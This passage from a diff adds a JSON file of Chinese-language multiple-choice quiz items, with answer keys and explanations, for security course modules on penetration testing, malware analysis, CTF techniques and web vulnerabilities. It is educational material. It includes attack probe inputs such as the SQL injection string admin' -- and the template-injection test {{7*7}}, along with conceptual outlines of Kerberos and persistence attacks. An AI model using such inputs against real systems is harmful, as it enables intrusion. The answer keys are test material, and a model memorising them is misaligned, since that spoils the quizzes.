+      "answer": 1,
+      "explanation": "资源脚本（.rc 文件）是 Metasploit 的自动化功能，可以将一系列命令（如设置工作空间、选择模块、配置参数、执行攻击）写入一个文本文件，然后通过 msfconsole -r script.rc 一键执行。这对于重复性的渗透测试流程非常有用。"
+    }
+  ],
+  "pentest-04-01": [
+    {
+      "question": "Kerberoasting 攻击的核心原理是什么？",
+      "options": [
+        "直接暴力破解 Kerberos 协议的加密算法",
+        "请求服务票据（TGS），然后对票据中用服务账户密钥加密的部分进行离线破解",
+        "伪造域控制器的响应来欺骗客户端",
+        "利用 Kerberos 协议的网络传输漏洞进行中间人攻击"
+      ],
+      "answer": 1,
+      "explanation": "Kerberoasting 利用的是 Kerberos 协议的设计特性：任何域用户都可以请求任何 SPN 的服务票据（TGS），而 TGS 的一部分是用服务账户的密钥（NTLM 哈希）加密的。攻击者可以离线暴力破解这个加密部分，从而获取服务账户的明文密码。这个过程不需要特殊的权限，只需要一个有效的域用户账户。"
+    },
+    {
+      "question": "Golden Ticket 攻击成功后，为什么即使重置目标用户密码也无法使票据失效？",
+      "options": [
+        "因为 Golden Ticket 存储在用户本地，不受域控影响",
+        "因为 Golden Ticket 使用的是 krbtgt 账户的密钥，而不是用户密码",
+        "因为 Golden Ticket 使用了不可逆的加密算法",
+        "因为 Windows 不会验证过期的 Kerberos 票据"
+      ],
+      "answer": 1,
+      "explanation": "Golden Ticket 是用 krbtgt 账户的 NTLM 哈希签名的伪造 TGT（票据授予票据）。它的验证依赖于 krbtgt 的密钥，而不是目标用户的密码。因此重置用户密码对 Golden Ticket 没有影响。要使其失效，必须重置 krbtgt 账户的密码两次（因为 AD 保留一个历史密钥用于向后兼容）。"
+    },
+    {
+      "question": "BloodHound 在 AD 渗透测试中的核心作用是什么？",
+      "options": [
+        "直接利用 AD 漏洞获取域管理员权限",
+        "使用图论分析域内权限关系，自动发现从当前用户到域管理员的最短攻击路径",
+        "加密域控制器的通信流量",
+        "自动化执行 Kerberoasting 攻击"
+      ],
+      "answer": 1,
+      "explanation": "BloodHound 通过采集域内的用户、组、ACL（访问控制列表）、会话等信息，使用图论算法构建权限关系图。它可以自动找出从当前低权限用户到域管理员的最短攻击路径，极大地提高了域渗透测试的效率。没有 BloodHound，手动分析数百个权限关系可能需要数天时间。"
+    }
+  ],
+  "pentest-05-01": [
+    {
+      "question": "在 Windows 横向移动中，WMI 相比 PsExec 的主要优势是什么？",
+      "options": [
+        "WMI 执行速度更快",
+        "WMI 不需要管理员权限",
+        "WMI 不需要在目标上创建服务，因此更隐蔽",
+        "WMI 可以跨平台使用"
+      ],
+      "answer": 2,
+      "explanation": "PsExec 通过在目标上创建一个 Windows 服务来执行命令，这会留下服务创建事件日志（Event ID 7045）。而 WMI 是 Windows 内置的管理框架，远程执行命令时不需要创建服务，留下的痕迹更少，因此更难被检测到。两者都需要管理员权限。"
+    },
+    {
+      "question": "以下哪种 Windows 持久化技术被认为最隐蔽，最难被常规检测发现？",
+      "options": [
+        "在注册表 Run Key 中添加启动项",
+        "创建 Windows 计划任务",
+        "WMI 事件订阅持久化",
+        "创建新的 Windows 服务"
+      ],
+      "answer": 2,
+      "explanation": "WMI 事件订阅持久化将恶意触发器存储在 WMI 仓库中（二进制文件），不在注册表或文件系统中留下明显痕迹。常规的启动项检查工具（如 Autoruns）可能不会显示 WMI 事件订阅，需要使用专门的 WMI 查询命令才能检测。相比之下，Run Key、计划任务和服务都更容易被发现。"
+    },
+    {
+      "question": "在授权的渗透测试结束后，以下哪项是最重要的后续工作？",
+      "options": [
+        "删除所有扫描工具的日志",
+        "在报告中详细记录所有创建的后门和持久化机制，帮助客户清除",
+        "保留一个后门以备后续复测使用",
+        "仅向客户提供漏洞列表，不需要记录操作细节"
+      ],
+      "answer": 1,
+      "explanation": "在授权的渗透测试中，必须在报告中详细记录所有创建的后门、持久化机制、上传的工具文件和外传的数据。这是职业道德的要求，也是帮助客户在测试后恢复系统安全状态的必要信息。留下未记录的后门不仅是违法行为，也会严重损害测试团队的信誉。"
+    }
+  ],
+  "malw-01-01": [
+    {
+      "question": "以下哪种恶意软件类型能够独立传播，不需要宿主文件？",
+      "options": [
+        "病毒（Virus）",
+        "蠕虫（Worm）",
+        "木马（Trojan）",
+        "广告软件（Adware）"
+      ],
+      "answer": 1,
+      "explanation": "蠕虫（Worm）可以独立传播，不需要依附于宿主文件。病毒需要感染其他文件，木马依赖社会工程学诱骗用户执行，而蠕虫如WannaCry利用网络漏洞自动扩散。"
+    },
+    {
+      "question": "Stuxnet通过USB传播时，利用了什么漏洞来触发恶意代码执行？",
+      "options": [
+        "autorun.inf 自动运行",
+        "Windows LNK 文件解析漏洞（CVE-2010-2568）",
+        "USB 固件漏洞",
+        "Windows 驱动签名绕过"
+      ],
+      "answer": 1,
+      "explanation": "Stuxnet利用Windows LNK漏洞（CVE-2010-2568），仅仅在资源管理器中浏览USB内容就能触发代码执行，不需要打开任何文件。这比传统的autorun方式更加隐蔽。"
+    },
+    {
+      "question": "Emotet在现代恶意软件生态中扮演什么角色？",
+      "options": [
+        "仅是一个银行木马",
+        "一个杀毒软件",
+        "恶意软件分发平台（MaaS），为其他恶意软件提供传播通道",
+        "一个合法的远程管理工具"
+      ],
+      "answer": 2,
+      "explanation": "Emotet从最初的银行木马演变为恶意软件即服务（Malware-as-a-Service）平台，向其他犯罪分子出租其僵尸网络，用于分发TrickBot、Ryuk、Cobalt Strike等其他恶意软件。"
+    }
+  ],
+  "malw-01-02": [
+    {
+      "question": "在恶意软件分析中，为什么推荐先进行静态分析再进行动态分析？",
+      "options": [
+        "因为静态分析更有趣",
+        "因为静态分析不需要运行样本，更安全；同时可以为动态分析提供方向",
+        "因为动态分析已经被淘汰了",
+        "因为静态分析能检测到所有恶意行为"
+      ],
+      "answer": 1,
+      "explanation": "静态分析不执行恶意代码就能获取关键信息（如导入表、字符串、熵值），是安全的分析方式。通过静态分析了解样本特征后，可以有针对性地设计动态分析实验，提高效率。"
+    },
+    {
+      "question": "PE文件某个节区的信息熵值为7.8，这最可能意味着什么？",
+      "options": [
+        "文件已损坏",
+        "该节区包含大量英文字符串",
+        "该节区数据已被加壳或加密",
+        "这是一个正常的PE文件"
+      ],
+      "answer": 2,
+      "explanation": "信息熵范围0-8，正常PE文件节区熵值通常在4.5-6.5之间。超过7.0几乎可以确定存在加壳（如UPX）或加密，说明数据被高度随机化处理过。"
+    },
+    {
+      "question": "在动态分析中，Process Monitor（ProcMon）主要监控什么？",
+      "options": [
+        "仅监控网络连接",
+        "仅监控CPU使用率",
+        "文件操作、注册表修改、进程/线程活动和网络连接",
+        "仅监控图形界面操作"
+      ],
+      "answer": 2,
+      "explanation": "Process Monitor是动态分析的核心工具，它记录每一个文件操作（CreateFile、ReadFile等）、注册表修改（RegSetValue等）、进程/线程活动以及网络连接，提供完整的系统行为视图。"
+    }
+  ],
+  "malw-02-01": [
+    {
+      "question": "以下YARA规则条件中，哪个能有效减少误报？",
+      "options": [
+        "仅匹配一个字符串 'powershell'",
+        "匹配 'powershell' 且文件是 PE 格式且有特定的导入表组合",
+        "使用 --fast-scan 模式",
+        "将规则名称改得更具体"
+      ],
+      "answer": 1,
+      "explanation": "仅匹配'powershell'会产生大量误报（很多合法脚本包含这个词）。组合多个条件（文件类型检查 + 字符串匹配 + 导入表验证）能大幅提高精确率，减少误报。"
+    },
+    {
+      "question": "YARA规则中，十六进制模式 { 4D 5A ?? 00 } 中的 '??' 表示什么？",
+      "options": [
+        "匹配空格字符",
+        "匹配任意单字节（通配符）",
+        "匹配问号字符本身",
+        "匹配零字节"
+      ],
+      "answer": 1,
+      "explanation": "'??' 是YARA十六进制模式中的单字节通配符，可以匹配任意一个字节值（0x00-0xFF）。这用于跳过不确定的地址偏移，使规则更加健壮。"
+    },
+    {
+      "question": "在为WannaCry编写YARA规则时，以下哪个特征最具唯一性（最不容易被变种修改）？",
+      "options": [
+        "文件名 'tasksche.exe'",
+        "勒索信文本 'Oops, your files have been encrypted!'",
+        "加密例程中的特定字节码序列和 'WANACRY!' 魔数",
+        "文件大小"
+      ],
+      "answer": 2,
+      "explanation": "文件名和勒索信文本容易被修改。但加密例程的核心字节码序列和文件头中的 'WANACRY!' 魔数是代码逻辑的一部分，修改它们会影响程序功能，因此在变种中通常保持不变。"
+    }
+  ],
+  "malw-03-01": [
+    {
+      "question": "Stuxnet的攻击目标是什么？",
+      "options": [
+        "全球银行系统",
+        "伊朗纳坦兹铀浓缩设施的工业控制系统",
+        "美国电网",
+        "社交媒体平台"
+      ],
+      "answer": 1,
+      "explanation": "Stuxnet精确针对伊朗纳坦兹铀浓缩工厂中的西门子S7-300 PLC，这些PLC控制铀浓缩离心机的转速。它通过反复改变离心机转速（1410Hz→1280Hz→2Hz）来造成物理破坏。"
+    },
+    {
+      "question": "NotPetya表面上是勒索软件，但它的真正目的是什么？",
+      "options": [
+        "窃取银行凭证",
+        "挖矿",
+        "不可逆的数据破坏",
+        "DDoS攻击"
+      ],
+      "answer": 2,
+      "explanation": "NotPetya伪装为勒索软件，但实际上它是一个破坏性武器。它覆写MBR、加密数据且故意设计为不可恢复（即使支付赎金也无法解密），其真正目的是造成最大程度的数据破坏。"
+    },
+    {
+      "question": "以下哪个不是近年来供应链攻击的共同特征？",
+      "options": [
+        "攻击者入侵软件构建系统或更新通道",
+        "利用信任关系进行传播",
+        "仅通过USB设备传播",
+        "影响范围广且检测困难"
+      ],
+      "answer": 2,
+      "explanation": "供应链攻击（如SolarWinds、MOVEit、XZ Utils）的共同特征是利用信任关系（软件供应商、开源社区）进行传播，影响范围广且检测困难。USB传播是传统方式，不是供应链攻击的特征。"
+    }
+  ],
+  "malw-04-01": [
+    {
+      "question": "以下哪种技术不是恶意软件用来检测沙箱环境的方法？",
+      "options": [
+        "检查CPU核数和内存大小",
+        "检查系统运行时间是否过短",
+        "使用AES-256加密文件",
+        "检查鼠标是否移动过"
+      ],
+      "answer": 2,
+      "explanation": "AES-256加密文件是勒索软件的恶意行为，与沙箱检测无关。检查硬件规格（CPU/内存）、系统运行时间、鼠标/键盘活动都是常见的沙箱检测方法。"
+    },
+    {
+      "question": "CAPE Sandbox相比Cuckoo Sandbox的主要增强功能是什么？",
+      "options": [
+        "更快的分析速度",
+        "自动载荷提取和反反沙箱能力",
+        "更美观的Web界面",
+        "仅支持Linux样本"
+      ],
+      "answer": 1,
+      "explanation": "CAPE在Cuckoo基础上增加了自动载荷提取（从加壳/加密样本中提取内嵌载荷）、反反沙箱（自动绕过沙箱检测）、多阶段分析（自动追踪多层恶意软件）等高级功能。"
+    },
+    {
+      "question": "一个成熟的自动化恶意软件分析工作流的正确顺序是什么？",
+      "options": [
+        "威胁情报共享 → 沙箱分析 → 样本采集 → YARA规则生成",
+        "样本采集 → 自动化沙箱分析 → IOC提取 → YARA规则生成 → 威胁情报共享",
+        "手动逆向工程 → 沙箱分析 → 报告撰写 → 邮件通知",
+        "YARA规则生成 → 样本采集 → IOC提取 → 沙箱分析"
+      ],
+      "answer": 1,
+      "explanation": "正确的工作流是：样本采集（邮件网关、EDR、IDS）→ 自动化沙箱分析 → IOC提取 → YARA规则自动生成 → 威胁情报共享（MISP）→ 防御规则更新。这个流水线实现端到端的自动化。"
+    }
+  ],
+  "ctfg-01-01": [
+    {
+      "question": "CTF 比赛中，flag 的常见格式是什么？",
+      "options": [
+        "password{xxxxxxx}",
+        "flag{xxxxxxx} 或 CTF{xxxxxxx}",
+        "secret(xxxxxxx)",
+        "key[xxxxxxx]"
+      ],
+      "answer": 1,
+      "explanation": "CTF 比赛中 flag 最常见的格式是 flag{xxxxxxx} 或 CTF{xxxxxxx}，有些平台会使用自己的前缀如 ctfshow{...}。"
+    },
+    {
+      "question": "Base64 编码的典型特征是什么？",
+      "options": [
+        "只包含数字 0-9",
+        "以 ## 开头",
+        "使用 A-Z、a-z、0-9、+、/ 字符，末尾可能有 = 填充",
+        "全部为大写字母"
+      ],
+      "answer": 2,
+      "explanation": "Base64 使用 64 个字符（A-Z, a-z, 0-9, +, /）编码数据，当数据长度不是 3 的倍数时，末尾会用 = 号进行填充。"
+    },
+    {
+      "question": "CTF 比赛中遇到一道难题卡壳超过 30 分钟，最佳策略是什么？",
+      "options": [
+        "继续死磕直到解出来",
+        "直接跳过这道题不再回来",
+        "先换一道题做，之后再回来攻坚",
+        "等待出题方放出完整解答"
+      ],
+      "answer": 2,
+      "explanation": "CTF 比赛是按总分计分的。在一道难题上死磕可能导致简单题没时间做。建议卡壳超过 30 分钟就先换题，保持得分效率。"
+    }
+  ],
+  "ctfg-02-01": [
+    {
+      "question": "栈溢出攻击的本质是什么？",
+      "options": [
+        "让程序消耗过多内存导致 OOM",
+        "通过超长输入覆盖函数返回地址，控制程序执行流",
+        "向程序注入恶意 SQL 语句",
+        "利用程序的格式化字符串漏洞"
+      ],
+      "answer": 1,
+      "explanation": "栈溢出攻击的核心是通过向缓冲区写入超长数据，覆盖栈上保存的返回地址，使程序跳转到攻击者指定的代码位置。"
+    },
+    {
+      "question": "在 Ret2libc 攻击中，为什么需要先泄露 libc 函数的地址？",
+      "options": [
+        "为了获取 libc 的版本号",
+        "因为 ASLR 会使 libc 每次加载的基地址随机化",
+        "为了修改 libc 中的函数代码",
+        "为了绕过 NX 保护"
+      ],
+      "answer": 1,
+      "explanation": "ASLR（地址空间布局随机化）使得每次运行时 libc 的基地址不同。通过泄露某个 libc 函数的实际地址，再减去其偏移，可以算出 libc 基地址，进而定位 system 和 /bin/sh 的位置。"
+    },
+    {
+      "question": "使用 pwntools 的 cyclic 工具确定偏移量的原理是什么？",
+      "options": [
+        "发送全 A 字符串观察崩溃位置",
+        "发送特殊模式字符串，根据崩溃时 RIP/EIP 的值反查偏移",
+        "逐字节增加输入长度直到崩溃",
+        "使用 GDB 直接查看缓冲区大小"
+      ],
+      "answer": 1,
+      "explanation": "cyclic 生成一个特殊的 de Bruijn 序列（如 aaaabaaacaaa...），每个 4/8 字节的子串都是唯一的。程序崩溃时 RIP 的值对应序列中某个唯一子串，用 cyclic_find 即可反查出精确偏移量。"
+    }
+  ],
+  "ctfg-03-01": [
+    {
+      "question": "Ghidra 最强大的功能是什么？",
+      "options": [
+        "汇编代码编辑",
+        "将汇编代码还原为类 C 的伪代码（反编译器）",
+        "自动生成 exploit 代码",
+        "实时网络流量分析"
+      ],
+      "answer": 1,
+      "explanation": "Ghidra 最核心的能力是其反编译器（Decompiler），能将机器码/汇编代码还原为可读的类 C 伪代码，极大降低了逆向分析的难度。"
+    },
+    {
+      "question": "在逆向分析中，交叉引用（XREF）的作用是什么？",
+      "options": [
+        "查看函数的执行时间",
+        "查看哪些代码引用了某个函数、变量或字符串",
+        "自动修复程序中的 bug",
+        "加密程序中的敏感字符串"
+      ],
+      "answer": 1,
+      "explanation": "交叉引用（XREF）是逆向分析的核心功能，它能告诉你某个符号（函数、变量、字符串）在哪些地方被引用或调用，帮助你理解程序的调用关系和数据流。"
+    },
+    {
+      "question": "当你发现 Ghidra 反编译出的代码是一个巨大的 while 循环加 switch-case，这最可能是什么？",
+      "options": [
+        "正常的循环逻辑",
+        "递归函数",
+        "VM（虚拟机）保护",
+        "字符串加密"
+      ],
+      "answer": 2,
+      "explanation": "这种模式是 VM 保护的典型特征。程序实现了一个自定义的虚拟机，用数组模拟寄存器，switch-case 分发不同的指令处理器。这是逆向中最难处理的混淆技术之一。"
+    }
+  ],
+  "ctfg-04-01": [
+    {
+      "question": "SQL 注入测试中，输入 admin' -- 后引号的作用是？",
+      "options": [
+        "让数据库返回所有用户",
+        "闭合 SQL 语句中的字符串引号，-- 注释掉后续条件",
+        "删除数据库中的 admin 用户",
+        "绕过 XSS 过滤器"
+      ],
+      "answer": 1,
+      "explanation": "单引号用于闭合原始 SQL 语句中的字符串字面量，使后续输入成为 SQL 代码的一部分。-- 是 SQL 注释符，会注释掉语句的剩余部分（如密码检查条件）。"
+    },
+    {
+      "question": "RSA 小指数攻击（e=3）的前提条件是什么？",
+      "options": [
+        "n 必须足够小",
+        "明文 m 的 e 次方小于 n（m^3 < n），使得取模运算没有生效",
+        "密文必须是 Base64 编码的",
+        "必须知道私钥 d"
+      ],
+      "answer": 1,
+      "explanation": "当 e=3 且 m^3 < n 时，加密公式 c = m^e mod n 简化为 c = m^3（因为没有超过 n，取模不生效）。此时直接对 c 开三次方根即可得到明文 m。"
+    }
+  ],
+  "ctfg-05-01": [
+    {
+      "question": "binwalk 工具的主要功能是什么？",
+      "options": [
+        "网络流量分析",
+        "通过扫描文件中的魔术数字（magic bytes）来识别和提取嵌入的文件",
+        "密码暴力破解",
+        "内存镜像分析"
+      ],
+      "answer": 1,
+      "explanation": "binwalk 通过扫描二进制文件中的特征字节序列（魔术数字）来识别嵌入的文件类型，如 ZIP（PK\\x03\\x04）、PNG（\\x89PNG）等，并可以自动提取这些文件。"
+    },
+    {
+      "question": "在 CTF 取证题中，DNS 隧道通常如何隐藏 flag？",
+      "options": [
+        "在 DNS 响应中嵌入加密文件",
+        "将 flag 编码为 Base64 放在 DNS 查询的子域名中",
+        "通过 DNS 重定向到恶意服务器",
+        "修改 DNS 服务器的配置文件"
+      ],
+      "answer": 1,
+      "explanation": "DNS 隧道通常将数据编码为 Base64 字符串，放在 DNS 查询的子域名部分。分析时需要提取所有 DNS 查询的子域名，拼接后解码得到 flag。"
+    },
+    {
+      "question": "使用 Volatility 进行内存取证时，发现 powershell.exe 是从 cmd.exe 启动的且有 -enc 参数，应该怎么做？",
+      "options": [
+        "忽略这个进程，继续分析其他内容",
+        "将 -enc 后的 Base64 字符串解码（注意 UTF-16LE 编码），分析执行的命令",
+        "直接重启该进程",
+        "删除这个进程的内存数据"
+      ],
+      "answer": 1,
+      "explanation": "PowerShell 的 -enc 参数接受 Base64 编码的 UTF-16LE 字符串。攻击者常用这种方式隐藏恶意命令。解码后可以了解攻击者执行了什么操作，可能直接发现 flag 或进一步分析的线索。"
+    }
+  ],
+  "ctfg-06-01": [
+    {
+      "question": "pwntools 中 p64() 函数的作用是什么？",
+      "options": [
+        "将字符串转换为 Base64 编码",
+        "将整数按 64 位小端序打包为字节序列",
+        "生成 64 位随机数",
+        "连接到 64 位远程服务器"
+      ],
+      "answer": 1,
+      "explanation": "p64() 将整数按 64 位（8 字节）小端序（Little-Endian）打包为字节序列。例如 p64(0xdeadbeef) 输出 b'\\xef\\xbe\\xad\\xde\\x00\\x00\\x00\\x00'。对应的 u64() 函数用于解包。"
+    },
+    {
+      "question": "为什么建议使用 Python 虚拟环境来安装 CTF 工具包？",
+      "options": [
+        "虚拟环境运行速度更快",
+        "避免不同项目的依赖冲突，保持环境干净",
+        "虚拟环境自带安全工具",
+        "可以绕过系统的安全限制"
+      ],
+      "answer": 1,
+      "explanation": "Python 虚拟环境为每个项目创建独立的包空间，避免不同 CTF 工具之间的依赖版本冲突。同时也能保持系统 Python 环境的干净，方便排查问题。"
+    }
+  ],
+  "web-01-01": [
+    {
+      "question": "SQL 注入攻击成功的根本原因是什么？",
+      "options": [
+        "密码太弱",
+        "后端将用户输入直接拼接到 SQL 语句",
+        "数据库未加密",
+        "浏览器未过滤"
+      ],
+      "answer": 1,
+      "explanation": "后端代码将用户输入直接拼接成 SQL 查询，而非使用参数化查询。"
+    },
+    {
+      "question": "哪种方式能从根本上防御 SQL 注入？",
+      "options": [
+        "过滤单引号",
+        "使用 WAF",
+        "使用参数化查询",
+        "限制输入长度"
+      ],
+      "answer": 2,
+      "explanation": "参数化查询将 SQL 代码和数据严格分离。"
+    },
+    {
+      "question": "UNION SELECT 攻击的前提条件？",
+      "options": [
+        "知道密码",
+        "注入点在 SELECT 语句且列数匹配",
+        "debug 模式",
+        "HTTPS"
+      ],
+      "answer": 1,
+      "explanation": "UNION 要求前后 SELECT 列数和数据类型一致。"
+    }
+  ],
+  "web-03-01": [
+    {
+      "question": "反射型 XSS 和存储型 XSS 的核心区别？",
+      "options": [
+        "攻击载荷不同",
+        "恶意脚本是否持久化存储在服务器",
+        "反射型只攻击 IE",
+        "存储型不需要 JS"
+      ],
+      "answer": 1,
+      "explanation": "反射型通过 URL 参数反射；存储型存入数据库影响所有访问者。"
+    },
+    {
+      "question": "HttpOnly Cookie 防御什么？",
+      "options": [
+        "所有 XSS",
+        "防止 JS 读取 Cookie，缓解 Cookie 窃取",
+        "SQL 注入",
+        "CSRF"
+      ],
+      "answer": 1,
+      "explanation": "HttpOnly 让 JS 无法读取 Cookie，但不能阻止 XSS 本身。"
+    },
+    {
+      "question": "DOM 型 XSS 的最大特点？",
+      "options": [
+        "只影响移动端",
+        "恶意代码不经过服务器，完全在浏览器端触发",
+        "不能用 alert()",
+        "已淘汰"
+      ],
+      "answer": 1,
+      "explanation": "DOM 型 XSS 数据流完全在客户端。"
+    }
+  ],
+  "web-04-01": [
+    {
+      "question": "CSRF 成功的根本原因？",
+      "options": [
+        "密码简单",
+        "浏览器自动附带目标域名的 Cookie",
+        "服务器未加密",
+        "JS 读跨域 Cookie"
+      ],
+      "answer": 1,
+      "explanation": "浏览器 Cookie 自动附带机制使服务器无法区分请求来源。"
+    },
+    {
+      "question": "CSRF Token 的防御原理？",
+      "options": [
+        "加密请求",
+        "表单中加入攻击者无法获取的随机值",
+        "阻止跨域请求",
+        "删除 Cookie"
+      ],
+      "answer": 1,
+      "explanation": "攻击者无法读取目标站点页面内容来获取 Token。"
+    },
+    {
+      "question": "SSRF 与 CSRF 的区别？",
+      "options": [
+        "SSRF 不需网络",
+        "SSRF 利用服务器向外发请求的能力",
+        "SSRF 只攻 HTTPS",
+        "SSRF 是 CSRF 子类型"
+      ],
+      "answer": 1,
+      "explanation": "CSRF 冒充用户身份；SSRF 诱导服务器访问内部资源。"
+    }
+  ],
+  "web-05-01": [
+    {
+      "question": "文件上传漏洞的核心利用条件？",
+      "options": [
+        "文件>10MB",
+        "上传文件能被服务器以代码方式执行",
+        "必须图片",
+        "POST 方法"
+      ],
+      "answer": 1,
+      "explanation": "关键是上传后的文件能否被 Web 服务器解析执行。"
+    },
+    {
+      "question": "前端 JS 校验为何不安全？",
+      "options": [
+        "JS 太慢",
+        "攻击者可用 Burp Suite 等绕过前端直接发请求",
+        "JS 不支持文件",
+        "卡顿"
+      ],
+      "answer": 1,
+      "explanation": "前端校验只在浏览器执行，攻击者可拦截修改请求。"
+    },
+    {
+      "question": "Content-Type 校验为何可绕过？",
+      "options": [
+        "加密的",
+        "由客户端设置，攻击者可随意修改",
+        "服务器不支持",
+        "只能识别图片"
+      ],
+      "answer": 1,
+      "explanation": "攻击者可把 .php 文件的 Content-Type 改为 image/jpeg。"
+    }
+  ],
+  "web-06-01": [
+    {
+      "question": "反序列化漏洞的核心前提？",
+      "options": [
+        "使用 JSON",
+        "服务器对不可信输入执行反序列化",
+        "数据库未加密",
+        "未用 HTTPS"
+      ],
+      "answer": 1,
+      "explanation": "攻击者构造恶意序列化数据在还原时触发代码执行。"
+    },
+    {
+      "question": "PHP POP Chain 的作用？",
+      "options": [
+        "加密数据",
+        "串联多个类的魔术方法实现代码执行",
+        "防止漏洞",
+        "优化性能"
+      ],
+      "answer": 1,
+      "explanation": "POP Chain 将看似无害的类通过魔术方法串联成攻击链。"
+    },
+    {
+      "question": "Java 反序列化为何比 PHP 更危险？",
+      "options": [
+        "Java 更快",
+        "Java 生态有大量可利用的 Gadget 库",
+        "Java 不支持 JSON",
+        "PHP 已修复"
+      ],
+      "answer": 1,
+      "explanation": "Java 反序列化自动触发 readObject() 链式调用。"
+    }
+  ],
+  "web-07-01": [
+    {
+      "question": "SSTI 与 XSS 的关键区别？",
+      "options": [
+        "SSTI 只攻击静态页",
+        "SSTI 在服务器端模板引擎执行，可实现 RCE",
+        "SSTI 不需输入",
+        "SSTI 只能用 Python"
+      ],
+      "answer": 1,
+      "explanation": "XSS 在浏览器执行 JS；SSTI 在服务器端执行模板代码。"
+    },
+    {
+      "question": "如何判断 SSTI？",
+      "options": [
+        "看加载速度",
+        "输入 {{7*7}} 观察响应是否出现 49",
+        "检查证书",
+        "测试上传"
+      ],
+      "answer": 1,
+      "explanation": "如果服务器将输入作为模板解析，{{7*7}} 会显示 49。"
+    },
+    {
+      "question": "防御 SSTI 最根本的措施？",
+      "options": [
+        "限制长度",
+        "永远不将用户输入作为模板代码解析",
+        "禁用 JS",
+        "WAF"
+      ],
+      "answer": 1,
+      "explanation": "确保用户输入只作为数据而非模板语法传递。"
+    }
+  ],
+  "web-08-01": [
+    {
+      "question": "JWT 签名防御什么？",
+      "options": [
+        "XSS",
+        "Token 被篡改，确保 payload 完整性",
+        "SQL 注入",
+        "CSRF"
+      ],
+      "answer": 1,
+      "explanation": "签名确保 Header 和 Payload 未被修改。"
+    },
+    {
+      "question": "JWT None 算法攻击？",
+      "options": [
+        "更强加密",
+        "将 alg 改为 none 并删除签名，某些库会接受",
+        "删除 Header",
+        "空密码"
+      ],
+      "answer": 1,
+      "explanation": "某些 JWT 库对 alg:none 跳过签名验证。"
+    },
+    {
+      "question": "OAuth 缺少 state 参数会导致？",
+      "options": [
+        "密码泄露",
+        "攻击者把第三方账号绑定到受害者服务账号",
+        "服务器崩溃",
+        "Cookie 被窃"
+      ],
+      "answer": 1,
+      "explanation": "不验证 state 可被利用进行账号绑定攻击。"
+    }
+  ],
+  "web-09-01": [
+    {
+      "question": "CORS Allow-Origin: * 加 Allow-Credentials: true 为何危险？",
+      "options": [
+        "导致 XSS",
+        "攻击者可从任意源读取认证响应",
+        "导致 SQL 注入",
+        "Cookie 过期"
+      ],
+      "answer": 1,
+      "explanation": "允许任意源恶意页面通过 fetch 读取认证数据。"
+    },
+    {
+      "question": "HTTP 请求走私的核心原理？",
+      "options": [
+        "加密头部",
+        "前端代理和后端对 CL/TE 解析不一致",
+        "用 HTTPS",
+        "增带宽"
+      ],
+      "answer": 1,
+      "explanation": "利用两端对请求边界判定差异走私隐藏请求。"
+    },
+    {
+      "question": "CL.TE 和 TE.CL 的区别？",
+      "options": [
+        "加密不同",
+        "CL.TE 前端用 CL 后端用 TE；TE.CL 相反",
+        "只是命名",
+        "GET vs POST"
+      ],
+      "answer": 1,
+      "explanation": "利用前端和后端对不同头部优先级的差异。"
+    }
+  ]
+};
